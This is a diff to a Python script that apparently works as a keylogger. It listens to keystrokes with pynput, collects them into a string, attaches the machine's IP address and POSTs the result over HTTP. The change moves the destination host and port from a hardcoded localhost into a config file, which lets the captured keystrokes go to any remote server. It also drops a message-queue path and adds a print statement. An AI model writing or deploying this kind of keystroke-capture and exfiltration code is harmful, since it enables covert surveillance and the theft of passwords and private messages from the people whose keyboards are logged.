@@ -2,7 +2,7 @@ from pynput.keyboard import Key, Listener
 import socket
 from requests import post
 from user_details import UserDetails
-from KeyboardInputProducer import send_user_details
+from configparser import SafeConfigParser
 
 currentString = ''
 
@@ -33,9 +33,21 @@ def clear_string():
     currentString = ''
 
 
+def get_config_parser():
+    parser = SafeConfigParser()
+    parser.read('application.ini')
+    return parser
+
+
+def get_destination_url():
+    parser = get_config_parser()
+    host = parser.get('destination', 'host')
+    port = parser.get('destination', 'port')
+    return host, port
+
+
 def post_message(message: UserDetails):
-    host = 'localhost'
-    port = '8080'
+    host, port = get_destination_url()
     endpoint = 'user-details'
     post(url="http://{}:{}/{}".format(host, port, endpoint), json=message.to_json())
 
@@ -43,13 +55,9 @@ def post_message(message: UserDetails):
 def send_message(message):
     if message == '' or message is None: return
     ip = get_ip_address()
-    user_details_json = UserDetails(ip, message).to_json()
-    add_to_topic(user_details_json)
-    post_message(user_details_json)
-
-
-def add_to_topic(message: UserDetails):
-    send_user_details(message)
+    user_details = UserDetails(ip, message)
+    print('Sent {}'.format(user_details.to_json()))
+    post_message(user_details)
 
 
 def on_press(key):
